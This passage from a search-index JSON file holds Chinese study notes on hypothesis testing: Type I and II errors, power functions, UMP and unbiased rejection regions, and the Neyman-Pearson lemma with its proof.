\u200b\u5177\u6709\u200b\u76f8\u540c\u200b\u7684\u200b\u5206\u5e03\u200b\u51fd\u6570\u200b.</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2008%20%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/","title":"Chapter 08 \u200b\u5047\u8bbe\u68c0\u9a8c","text":""},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2008%20%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/#81","title":"8.1 \u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898","text":"<p>\u200b\u7b2c\u4e00\u7c7b\u200b\u9519\u8bef\u200b\u548c\u200b\u7b2c\u4e8c\u7c7b\u200b\u9519\u8bef\u200b:</p> \u200b\u771f\u5b9e\u60c5\u51b5\u200b \u200b\u6837\u672c\u200b\u60c5\u51b5\u200b \u200b\u5224\u65ad\u200b \u200b\u6b63\u786e\u6027\u200b \\(H_0\\) \u200b\u4e3a\u200b\u771f\u200b \\(x \\in \\mathcal{W}\\) \u200b\u5426\u5b9a\u200b \\(H_0\\) \u200b\u9519\u8bef\u200b, \u200b\u7b2c\u4e00\u7c7b\u200b\u9519\u8bef\u200b \\(H_0\\) \u200b\u4e3a\u200b\u5047\u200b \\(x \\in \\mathcal{W}\\) \u200b\u5426\u5b9a\u200b \\(H_0\\) \u200b\u6b63\u786e\u200b \\(H_0\\) \u200b\u4e3a\u200b\u771f\u200b \\(x \\not \\in \\mathcal{W}\\) \u200b\u63a5\u53d7\u200b \\(H_0\\) \u200b\u6b63\u786e\u200b \\(H_0\\) \u200b\u4e3a\u200b\u5047\u200b \\(x \\not \\in \\mathcal{W}\\) \u200b\u63a5\u53d7\u200b \\(H_0\\) \u200b\u9519\u8bef\u200b, \u200b\u7b2c\u4e8c\u7c7b\u200b\u9519\u8bef\u200b \u200b\u4e00\u822c\u6765\u8bf4\u200b, \u200b\u4e0d\u200b\u53ef\u80fd\u200b\u4f7f\u72af\u200b\u4e24\u7c7b\u200b\u9519\u8bef\u200b\u7684\u200b\u6982\u7387\u200b\u4e00\u81f4\u200b\u5730\u200b\u4efb\u610f\u200b\u5c0f\u200b, \u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9996\u5148\u200b\u5e0c\u671b\u200b\u72af\u200b\u7b2c\u4e00\u7c7b\u200b\u9519\u8bef\u200b\u7684\u200b\u6982\u7387\u200b\u5c3d\u53ef\u80fd\u200b\u5c0f\u200b. <p>\u200b\u529f\u6548\u200b\u51fd\u6570\u200b:</p> <p>\u200b\u8bbe\u200b \\((\\Theta_0, \\Theta_1)\\) \u200b\u4e3a\u200b\u603b\u4f53\u200b\u6a21\u578b\u200b \\(X \\sim F_{\\theta}(\\theta \\in \\Theta)\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b, \\(\\boldsymbol{X}=(X_1,\\cdots,X_n)\\) \u200b\u4e3a\u200b\u603b\u4f53\u200b\u7684\u200b\u4e00\u4e2a\u200b\u6837\u672c\u200b, \\(\\mathcal{W}\\) \u200b\u4e3a\u200b\u8be5\u200b\u95ee\u9898\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5426\u5b9a\u200b\u57df\u200b, \\(\\alpha \\in (0,1)\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b\u5e38\u6570\u200b.</p> <p>(1) \u200b\u79f0\u200b\u5b9a\u4e49\u200b\u5728\u200b \\(\\Theta\\) \u200b\u4e0a\u200b\u7684\u200b\u51fd\u6570\u200b \\(\\beta_{\\mathcal{W}}(\\theta) \\triangleq P_{\\theta}(\\mathbf{X}\\in \\mathcal{W})\\)  \u200b\u4e3a\u200b \\(\\mathcal{W}\\) \u200b\u7684\u200b\u529f\u6548\u200b\u51fd\u6570\u200b</p> <p>(2) \u200b\u82e5\u200b \\(\\mathcal{W}\\) \u200b\u6ee1\u8db3\u6761\u4ef6\u200b</p> \\[ \\sup_{\\theta\\in\\Theta_0}\\beta_{\\mathcal{W}}(\\theta)\\leq\\alpha \\] <p>\u200b\u5219\u200b\u79f0\u200b \\(\\mathcal{W}\\) \u200b\u4e3a\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b \\((\\Theta_0, \\Theta_1)\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b \u200b\u663e\u8457\u6027\u200b\u6c34\u5e73\u200b (\u200b\u7b80\u79f0\u200b\u6c34\u5e73\u200b) \u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b\u5426\u5b9a\u200b\u57df\u200b.</p> <p>(\u200b\u4eba\u200b\u8bdd\u200b: \u200b\u5982\u679c\u200b\u53c2\u6570\u200b\u5728\u200b \\(\\Theta_0\\) \u200b\u5185\u200b\u90a3\u4e48\u200b\u62bd\u6837\u200b\u5f97\u5230\u200b\u7684\u200b\u6837\u672c\u200b\u5728\u200b\u5426\u5b9a\u200b\u57df\u200b\u7684\u200b\u6982\u7387\u200b\u5c0f\u4e8e\u200b\u7b49\u4e8e\u200b \\(\\alpha\\), \u200b\u4e5f\u5c31\u662f\u8bf4\u200b\u88ab\u200b\u5426\u5b9a\u200b\u7684\u200b\u6982\u7387\u200b\u5c0f\u4e8e\u200b\u7b49\u4e8e\u200b \\(\\alpha\\))</p> <p>\u200b\u8fd9\u6837\u200b\u6211\u4eec\u200b\u5c31\u200b\u63a7\u5236\u200b\u4e86\u200b\u72af\u200b\u7b2c\u4e00\u7c7b\u200b\u9519\u8bef\u200b\u7684\u200b\u6982\u7387\u200b, \u200b\u63a5\u4e0b\u6765\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5728\u200b\u663e\u8457\u6027\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b\u5426\u5b9a\u200b\u57df\u200b\u4e2d\u200b\u5bfb\u627e\u200b\u6700\u4f18\u200b\u7684\u200b\u5426\u5b9a\u200b\u57df\u200b, \u200b\u4e5f\u200b\u5c31\u662f\u200b\u8981\u200b\u8ba9\u200b\u72af\u200b\u7b2c\u4e8c\u7c7b\u200b\u9519\u8bef\u200b\u7684\u200b\u6982\u7387\u200b\u4e5f\u200b\u5c3d\u53ef\u80fd\u200b\u5c0f\u200b.</p> <p>\u200b\u8bbe\u200b \\((\\Theta_0, \\Theta_1)\\) \u200b\u4e3a\u200b\u603b\u4f53\u200b\u6a21\u578b\u200b \\(X \\sim F_{\\theta}(\\theta \\in \\Theta)\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b, \\(\\boldsymbol{X}=(X_1,\\cdots,X_n)\\) \u200b\u4e3a\u200b\u603b\u4f53\u200b\u7684\u200b\u4e00\u4e2a\u200b\u6837\u672c\u200b, \\(\\mathcal{W}\\) \u200b\u4e3a\u200b\u8be5\u200b\u95ee\u9898\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5426\u5b9a\u200b\u57df\u200b, \u200b\u79f0\u200b \\(\\mathcal{W}\\) \u200b\u4e3a\u200b\u8be5\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b\u7684\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b \u200b\u4e00\u81f4\u200b\u6700\u5927\u200b\u529f\u6548\u200b\u5426\u5b9a\u200b\u57df\u200b(UMP\u200b\u5426\u5b9a\u200b\u57df\u200b), \u200b\u5982\u679c\u200b:</p> <p>(1) \\(\\mathcal{W}\\) \u200b\u662f\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b\u5426\u5b9a\u200b\u57df\u200b.</p> <p>(2) \u200b\u5bf9\u200b\u4efb\u4f55\u200b\u5176\u4ed6\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b\u5426\u5b9a\u200b\u57df\u200b \\(\\widetilde{\\mathcal{W}}\\), \u200b\u5747\u200b\u6709\u200b:</p> \\[ \\beta_{\\mathcal{W}}(\\theta)\\geq\\beta_{\\widetilde{\\mathcal{W}}}(\\theta) \\quad (\\forall \\theta\\in\\Theta_1) \\] <p>(\u200b\u4eba\u200b\u8bdd\u200b: \\(\\mathcal{W}\\) \u200b\u6ee1\u8db3\u200b\u72af\u200b\u7b2c\u4e00\u7c7b\u200b\u9519\u8bef\u200b\u7684\u200b\u6982\u7387\u200b\u5c0f\u4e8e\u200b\u7b49\u4e8e\u200b \\(\\alpha\\), \u200b\u800c\u4e14\u200b\u72af\u200b\u7b2c\u4e8c\u7c7b\u200b\u9519\u8bef\u200b\u7684\u200b\u6982\u7387\u200b\u662f\u200b\u6700\u5c0f\u200b\u7684\u200b, \u200b\u4e5f\u200b\u5c31\u662f\u200b\u6761\u4ef6\u200b\u91cc\u9762\u200b\u7684\u200b \\(H_0\\) \u200b\u4e0d\u200b\u4e3a\u200b\u771f\u7684\u200b\u65f6\u5019\u200b\u5426\u5b9a\u200b\u6982\u7387\u200b\u6700\u5927\u200b)</p> <p>\u200b\u7531\u4e8e\u200b UMP \u200b\u5426\u5b9a\u200b\u57df\u200b\u7684\u200b\u8981\u6c42\u200b\u592a\u200b\u82db\u523b\u200b, \u200b\u4e0d\u5f97\u5df2\u200b\u800c\u6c42\u200b\u5176\u6b21\u200b, \u200b\u63d0\u51fa\u200b\u4e86\u200b\u65e0\u504f\u6027\u200b\u7684\u200b\u8981\u6c42\u200b</p> <p>\u200b\u8bbe\u200b \\((\\Theta_0, \\Theta_1)\\) \u200b\u4e3a\u200b\u603b\u4f53\u200b\u6a21\u578b\u200b \\(X \\sim F_{\\theta}(\\theta \\in \\Theta)\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b, \\(\\mathbf{X}=(X_1,\\cdots,X_n)\\) \u200b\u4e3a\u200b\u603b\u4f53\u200b\u7684\u200b\u4e00\u4e2a\u200b\u6837\u672c\u200b, \\(\\mathcal{W}\\) \u200b\u4e3a\u200b\u8be5\u200b\u95ee\u9898\u200b\u7684\u200b\u4e00\u4e2a\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b\u5426\u5b9a\u200b\u57df\u200b, \u200b\u79f0\u200b \\(\\mathcal{W}\\) \u200b\u4e3a\u200b\u8be5\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b\u7684\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b \u200b\u65e0\u504f\u200b\u5426\u5b9a\u200b\u57df\u200b, \u200b\u5982\u679c\u200b\u5bf9\u200b\u4efb\u4f55\u200b \\(\\theta_0\\in\\Theta_0\\) \u200b\u548c\u200b \\(\\theta_1\\in\\Theta_1\\) \u200b\u5747\u200b\u6709\u200b:</p> \\[ \\beta_{\\mathcal{W}}(\\theta_0)\\leq \\alpha \\leq\\beta_{{\\mathcal{W}}}(\\theta_1)  \\] <p>\u200b\u6709\u200b\u4e86\u200b\u65e0\u504f\u6027\u200b\u7684\u200b\u6761\u4ef6\u200b\u6211\u4eec\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6392\u9664\u200b\u4e00\u4e9b\u200b\u5f88\u200b\u5947\u602a\u200b\u7684\u200b\u5426\u5b9a\u200b\u57df\u200b, \u200b\u5b83\u4eec\u200b\u5728\u200b\u53c2\u6570\u200b\u5c5e\u4e8e\u200b \\(\\Theta_1\\) \u200b\u7684\u200b\u65f6\u5019\u200b\u6709\u200b\u7684\u200b\u529f\u6548\u200b\u51fd\u6570\u200b\u5f88\u5c0f\u200b, \u200b\u5f88\u200b\u5bb9\u6613\u63a5\u53d7\u200b \\(H_0\\) \u200b\u5bfc\u81f4\u200b\u72af\u200b\u7b2c\u4e8c\u7c7b\u200b\u9519\u8bef\u200b, \u200b\u6709\u200b\u7684\u200b\u529f\u6548\u200b\u51fd\u6570\u200b\u53c8\u200b\u5f88\u5927\u200b, \u200b\u5bfc\u81f4\u200b\u6211\u4eec\u200b\u627e\u200b\u4e0d\u5230\u200b\u4e00\u81f4\u200b\u6700\u5927\u200b\u529f\u6548\u200b\u5426\u5b9a\u200b\u57df\u200b. \u200b\u6392\u9664\u200b\u4e86\u200b\u8fd9\u7c7b\u200b\u5426\u5b9a\u200b\u57df\u200b\u540e\u200b\u6211\u4eec\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5b9a\u4e49\u200b\u6700\u4f18\u200b\u65e0\u504f\u200b\u5426\u5b9a\u200b\u57df\u200b(UMPU\u200b\u5426\u5b9a\u200b\u57df\u200b).</p> <p>\u200b\u8bbe\u200b \\((\\Theta_0, \\Theta_1)\\) \u200b\u4e3a\u200b\u603b\u4f53\u200b\u6a21\u578b\u200b \\(X \\sim F_{\\theta}(\\theta \\in \\Theta)\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b, \\(\\boldsymbol{X}=(X_1,\\cdots,X_n)\\) \u200b\u4e3a\u200b\u603b\u4f53\u200b\u7684\u200b\u4e00\u4e2a\u200b\u6837\u672c\u200b, \\(\\mathcal{W}\\) \u200b\u4e3a\u200b\u8be5\u200b\u95ee\u9898\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5426\u5b9a\u200b\u57df\u200b, \u200b\u79f0\u200b \\(\\mathcal{W}\\) \u200b\u4e3a\u200b\u8be5\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b\u7684\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b \u200b\u6700\u4f18\u200b\u65e0\u504f\u200b\u5426\u5b9a\u200b\u57df\u200b(UMPU\u200b\u5426\u5b9a\u200b\u57df\u200b), \u200b\u5982\u679c\u200b:</p> <p>(1) \\(\\mathcal{W}\\) \u200b\u662f\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b\u65e0\u504f\u200b\u5426\u5b9a\u200b\u57df\u200b.</p> <p>(2) \u200b\u5bf9\u200b\u4efb\u4f55\u200b\u5176\u4ed6\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b\u65e0\u504f\u200b\u5426\u5b9a\u200b\u57df\u200b \\(\\widetilde{\\mathcal{W}}\\), \u200b\u5747\u200b\u6709\u200b:</p> \\[ \\beta_{\\mathcal{W}}(\\theta)\\geq\\beta_{\\widetilde{\\mathcal{W}}}(\\theta) \\quad (\\forall \\theta\\in\\Theta_1) \\] <p>\u200b\u5728\u200b\u9009\u62e9\u200b\u96f6\u200b\u5047\u8bbe\u200b\u7684\u200b\u65f6\u5019\u200b, \u200b\u6211\u4eec\u200b\u8981\u200b\u6743\u8861\u200b\u54ea\u200b\u4e00\u7c7b\u200b\u9519\u8bef\u200b\u5e26\u6765\u200b\u7684\u200b\u635f\u5931\u200b\u66f4\u5927\u200b, \u200b\u9009\u62e9\u200b\u5408\u9002\u200b\u7684\u200b\u96f6\u200b\u5047\u8bbe\u200b. </p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2008%20%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/#82-n-p","title":"8.2 N-P \u200b\u5f15\u7406\u200b\u548c\u200b\u4f3c\u7136\u6bd4\u200b\u68c0\u9a8c","text":"<p>\u200b\u5148\u200b\u6765\u200b\u8003\u8651\u200b\u6700\u200b\u7b80\u5355\u200b\u7684\u200b\u60c5\u51b5\u200b, \u200b\u8bbe\u200b \\(X\\sim F_{\\theta}\\), \\(\\theta\\in\\Theta=\\{\\theta_0, \\theta_1\\}\\) , \u200b\u5373\u200b\u53c2\u6570\u200b\u7a7a\u95f4\u200b\u53ea\u6709\u200b\u4e24\u4e2a\u200b\u70b9\u200b, \u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b\u4e3a\u200b:</p> \\[ H_0:\\theta=\\theta_0 \\leftrightarrow H_1:\\theta=\\theta_1 \\] <p>\u200b\u8fd9\u200b\u7c7b\u200b\u68c0\u9a8c\u200b\u95ee\u9898\u200b\u79f0\u4e3a\u200b \u200b\u7b80\u5355\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b, \u200b\u5f53\u200b \\(\\Theta_0, \\Theta_1\\) \u200b\u6709\u200b\u4e00\u4e2a\u200b\u4e0d\u662f\u200b\u5355\u70b9\u200b\u96c6\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u662f\u200b\u590d\u6742\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b. \u200b\u5bf9\u4e8e\u200b\u7b80\u5355\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b, \u200b\u6709\u200b\u5982\u4e0b\u200b\u7684\u200b N-P \u200b\u5f15\u7406\u200b.</p> <p>(N-P \u200b\u5f15\u7406\u200b) \u200b\u8bbe\u200b \\(X\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u6837\u672c\u200b\u4e3a\u200b \\(\\boldsymbol{X}=(X_1,\\cdots,X_n)\\), \u200b\u5047\u8bbe\u200b \\(X\\) \u200b\u7684\u200b\u5206\u5e03\u200b\u5bc6\u5ea6\u200b\u4e3a\u200b \\(f(\\boldsymbol{x},\\theta),\\theta=\\theta_0\u200b\u6216\u200b\\theta_1\\), \u200b\u8bb0\u200b \\(L(\\boldsymbol{x},\\theta)=\\prod_{i=1}^n f(x_i,\\theta)\\),  \u200b\u5176\u4e2d\u200b \\(\\boldsymbol{x}=(x_1,\\cdots,x_n)\\), \u200b\u82e5\u200b\u5bf9\u4e8e\u200b\u7ed9\u5b9a\u200b\u7684\u200b \\(\\alpha\\in(0,1)\\), \\(n\\) \u200b\u7ef4\u7a7a\u95f4\u200b\u7684\u200b\u96c6\u5408\u200b</p> \\[ \\mathcal{W}=\\{\\boldsymbol{x}:L(\\boldsymbol{x},\\theta_1)&gt;\\lambda_0L(\\boldsymbol{x},\\theta_0)\\} \\quad (\\lambda_0\\geq0\u200b\u4e3a\u200b\u5e38\u6570\u200b) \\] <p>\u200b\u6ee1\u8db3\u200b</p> \\[ \\beta_\\mathcal{W}(\\theta_0)\\triangleq\\int_{\\mathcal{W}}L(\\boldsymbol{x},\\theta_0)\\mathrm{d}\\boldsymbol{x}=\\alpha \\] <p>\u200b\u5219\u200b \\(\\mathcal{W}\\) \u200b\u5c31\u662f\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b UMP \u200b\u5426\u5b9a\u200b\u57df\u200b.</p> <p>(\u200b\u4eba\u200b\u8bdd\u200b: \u200b\u5982\u679c\u200b\u6709\u200b\u4e00\u4e2a\u200b\u6ee1\u8db3\u200b\u4f3c\u7136\u6bd4\u200b\u5927\u4e8e\u200b\u67d0\u4e2a\u200b\u5e38\u6570\u200b\u7684\u200b\u96c6\u5408\u200b, \u200b\u800c\u4e14\u200b\u53c2\u6570\u200b\u4e3a\u200b \\(\\theta_0\\) \u200b\u7684\u200b\u65f6\u5019\u200b\u6837\u672c\u200b\u843d\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u96c6\u5408\u200b\u7684\u200b\u6982\u7387\u200b\u662f\u200b \\(\\alpha\\), \u200b\u90a3\u4e48\u200b\u5b83\u200b\u5c31\u662f\u200b UMP \u200b\u5426\u5b9a\u200b\u57df\u200b)</p> <p>\u200b\u8bc1\u660e\u200b: \u200b\u9996\u5148\u200b\u8bf4\u660e\u200b \\(\\mathcal{W}\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b\u5426\u5b9a\u200b\u57df\u200b(\u200b\u663e\u7136\u200b). \u200b\u7136\u540e\u200b\u8bf4\u660e\u200b\u4efb\u53d6\u200b\u4e00\u4e2a\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b\u5426\u5b9a\u200b\u57df\u200b \\(\\widetilde{\\mathcal{W}}\\) \u200b\u6709\u200b \\(\\beta_{\\mathcal{W}}(\\theta_1) \\geq \\beta_{\\widetilde{\\mathcal{W}}}(\\theta_1)\\) </p> \\[ \\begin{align*} \\beta_{\\tilde{W}}(\\theta_1) - \\beta_{W}(\\theta_1) &amp;= P_{\\theta_1}(\\mathbf{X} \\in \\tilde{W}) - P_{\\theta_1}(\\mathbf{X} \\in W) \\\\ &amp;= \\int \\cdots \\int_{\\tilde{W}} L(\\mathbf{x}, \\theta_1) d\\mathbf{x} - \\int \\cdots \\int_{W} L(\\mathbf{x}, \\theta_1) d\\mathbf{x} \\\\ &amp;= \\int \\cdots \\int_{\\tilde{W} \\setminus W} L(\\mathbf{x}, \\theta_1) d\\mathbf{x} - \\int \\cdots \\int_{W \\setminus \\tilde{W}} L(\\mathbf{x}, \\theta_1) d\\mathbf{x} \\\\ &amp;\\ge \\lambda_0 \\left[ \\int \\cdots \\int_{\\tilde{W} \\setminus W} L(\\mathbf{x}, \\theta_0) d\\mathbf{x} - \\int \\cdots \\int_{W \\setminus \\tilde{W}} L(\\mathbf{x}, \\theta_0) d\\mathbf{x} \\right] \\\\ &amp;= \\lambda_0 \\left[ \\int \\cdots \\int_{\\tilde{W}} L(\\mathbf{x}, \\theta_0) d\\mathbf{x} - \\int \\cdots \\int_{W} L(\\mathbf{x}, \\theta_0) d\\mathbf{x} \\right] \\\\ &amp;= \\lambda_0 [\\alpha - \\beta_{\\tilde{W}}(\\theta_0)] \\ge 0 \\end{align*} \\] <p>\u200b\u8bc1\u660e\u200b\u7684\u200b\u5173\u952e\u200b\u662f\u200b\u5229\u7528\u200b\u4e86\u200b\u96c6\u5408\u200b \\(\\mathcal{W}\\) \u200b\u7684\u200b\u6027\u8d28\u200b, \u200b\u5728\u200b\u96c6\u5408\u200b\u5185\u200b\u7684\u200b \\(\\boldsymbol{x}\\) \u200b\u6ee1\u8db3\u200b\u4f3c\u7136\u6bd4\u200b\u5927\u4e8e\u200b\u5e38\u6570\u200b, \u200b\u4e0d\u200b\u5728\u200b\u96c6\u5408\u200b\u91cc\u200b\u7684\u200b\u5c31\u662f\u200b\u5c0f\u4e8e\u200b\u8be5\u200b\u5e38\u6570\u200b, \u200b\u521a\u597d\u200b\u4e00\u4e2a\u200b\u5728\u200b\u6b63\u200b\u53f7\u200b\u4e00\u4e2a\u200b\u5728\u200b\u8d1f\u53f7\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u5229\u7528\u200b\u8fd9\u4e2a\u200b\u4e0d\u7b49\u5f0f\u200b. \u200b\u6700\u540e\u200b\u4e00\u6b65\u200b\u5229\u7528\u200b \\(\\widetilde{\\mathcal{W}}\\) \u200b\u662f\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u5426\u5b9a\u200b\u57df\u200b\u7684\u200b\u6027\u8d28\u200b.</p> <p>N-P \u200b\u5f15\u529b\u200b\u7684\u200b\u6838\u5fc3\u200b\u662f\u200b\u5229\u7528\u200b\u4f3c\u7136\u6bd4\u200b \\(\\lambda(\\boldsymbol{x})\\triangleq L(\\boldsymbol{x},\\theta_1)/L(\\boldsymbol{x},\\theta_0)\\) \u200b\u6784\u9020\u200b\u5426\u5b9a\u200b\u57df\u200b, \u200b\u56e0\u6b64\u200b\u7ed9\u51fa\u200b\u7684\u200b\u5426\u5b9a\u200b\u57df\u200b\u53c8\u79f0\u200b\u4f3c\u7136\u6bd4\u200b\u5426\u5b9a\u200b\u57df\u200b, \u200b\u68c0\u9a8c\u6cd5\u200b\u53eb\u505a\u200b\u4f3c\u7136\u6bd4\u200b\u68c0\u9a8c\u200b. \u200b\u4e00\u822c\u6765\u8bf4\u200b\u5148\u200b\u5199\u51fa\u200b\u5426\u5b9a\u200b\u57df\u200b\u7684\u200b\u5f62\u5f0f\u200b, \u200b\u7136\u540e\u200b\u5728\u200b\u53c2\u6570\u200b\u4e3a\u200b \\(\\theta_0\\) \u200b\u7684\u200b\u6761\u4ef6\u200b\u4e0b\u200b\u518d\u200b\u6839\u636e\u200b\u6c34\u5e73\u200b \\(\\alpha\\) \u200b\u6c42\u200b\u51fa\u200b\u5e38\u6570\u200b \\(\\lambda_0\\).</p> <p>\u200b\u9644\u5e26\u200b\u8bf4\u660e\u200b\u4e00\u4e0b\u200b\uff1a\u200b\u4f5c\u4e3a\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u7684\u200b\u89e3\u200b\uff0c\u200b\u5426\u5b9a\u200b\u57df\u200b \\(W\\) \u200b\u662f\u200b\u4e00\u6837\u200b\u672c\u70b9\u200b \\(\\mathbf{x}\\) \u200b\u7684\u200b\u96c6\u5408\u200b\u3002\u200b\u901a\u5e38\u200b\u7ecf\u8fc7\u200b\u7b80\u5316\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5426\u5b9a\u200b\u57df\u200b\u5177\u6709\u200b \\(\\{\\mathbf{x}: T(\\mathbf{x}) &gt; c\\}\\) \u200b\u6216\u200b \\(\\{\\mathbf{x}: T(\\mathbf{x}) &lt; c_1\\} \\cup \\{\\mathbf{x}: T(\\mathbf{x}) &gt; c_2\\}\\) \u200b\u7684\u200b\u5f62\u5f0f\u200b\uff0c\u200b\u5b83\u200b\u662f\u200b\u901a\u8fc7\u200b\u7edf\u8ba1\u200b\u91cf\u200b \\(T(\\mathbf{x})\\) \u200b\u6784\u9020\u200b\u5f97\u5230\u200b\u7684\u200b\u3002\u200b\u6b64\u65f6\u200b\uff0c\u200b\u7edf\u8ba1\u200b\u91cf\u200b \\(T(\\mathbf{x})\\) \u200b\u5c31\u200b\u79f0\u4e3a\u200b\u68c0\u9a8c\u200b\u7edf\u8ba1\u200b\u91cf\u200b\u3002</p> <p>\u200b\u5728\u200b\u6c42\u200b\u5426\u5b9a\u200b\u57df\u200b\u7684\u200b\u65f6\u5019\u200b, \u200b\u53ef\u200b\u5229\u7528\u200b\u5426\u5b9a\u200b\u57df\u200b\u5185\u5bb9\u200b\u4e0d\u53d8\u200b\u7684\u200b\u539f\u5219\u200b\u5bf9\u200b\u5426\u5b9a\u200b\u57df\u200b\u7684\u200b\u5f62\u5f0f\u200b\u4f5c\u200b\u53d8\u6362\u200b, \u200b\u4f7f\u5f97\u200b\u5426\u5b9a\u200b\u57df\u200b\u4e2d\u200b\u5f85\u5b9a\u200b\u5e38\u6570\u200b\u7684\u200b\u786e\u5b9a\u200b\u53d8\u5f97\u200b\u5341\u5206\u200b\u5bb9\u6613\u200b.</p> <p>\u200b\u6839\u636e\u200b N-P \u200b\u5f15\u7406\u200b\u6c42\u200b\u51fa\u6765\u200b\u7684\u200b\u5426\u5b9a\u200b\u57df\u200b\u5177\u6709\u200b\u65e0\u504f\u6027\u200b, \u200b\u53ef\u4ee5\u200b\u9a8c\u8bc1\u200b \\(\\beta_{\\mathcal{W}}(\\theta_1)\\geq\\alpha\\), \u200b\u9a8c\u8bc1\u200b\u8fc7\u7a0b\u200b\u57fa\u672c\u4e0a\u200b\u8fd8\u662f\u200b\u5229\u7528\u200b \\(\\mathcal{W}\\) \u200b\u7684\u200b\u6027\u8d28\u200b\u5c06\u200b\u79ef\u5206\u200b\u5316\u4e3a\u200b\u5728\u200b \\(\\mathcal{W}\\) \u200b\u4e0a\u200b\u7684\u200b\u548c\u200b\u5728\u200b\u5b83\u200b\u7684\u200b\u4f59\u96c6\u200b\u4e0a\u200b\u7684\u200b. \u200b\u7136\u540e\u200b\u5229\u7528\u200b\u4e0d\u7b49\u5f0f\u200b\u653e\u7f29\u200b.</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2008%20%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/#83","title":"8.3 \u200b\u5355\u200b\u53c2\u6570\u200b\u6a21\u578b\u200b\u7684\u200b\u68c0\u9a8c","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\u8003\u8651\u200b\u7a0d\u5fae\u200b\u590d\u6742\u200b\u4e00\u70b9\u200b\u7684\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b, \u200b\u8bbe\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b\u4e3a\u200b</p> \\[ H_0:\\theta\\in\\Theta_0 \\leftrightarrow H_1:\\theta=\\theta_1 \\tag{3.1} \\] <p>\u200b\u73b0\u5728\u200b \\(\\Theta_0\\) \u200b\u4e0d\u518d\u200b\u662f\u200b\u5355\u70b9\u200b\u96c6\u200b\u4e86\u200b, \u200b\u4f46\u662f\u200b, \u200b\u5982\u679c\u200b\u6ee1\u8db3\u200b\u4ee5\u4e0b\u200b\u6761\u4ef6\u200b, \u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u627e\u51fa\u200b\u6c34\u5e73\u200b\u4e3a\u200b \\(\\alpha\\) \u200b\u7684\u200b UMP \u200b\u5426\u5b9a\u200b\u57df\u200b.</p> <p>(\u200b\u5b9a\u7406\u200b3.1) \u200b\u8bbe\u200b \\(\\theta_0\\in\\Theta_0\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b\u53c2\u6570\u200b\u70b9\u200b, \\(\\mathcal{W}\\) \u200b\u662f\u200b\u7b80\u5355\u200b\u5047\u8bbe\u68c0\u9a8c\u200b\u95ee\u9898\u200b</p> \\[ H_0:\\theta\\in\\theta_0 \\leftrightarrow H_1:\\theta=\\theta_1 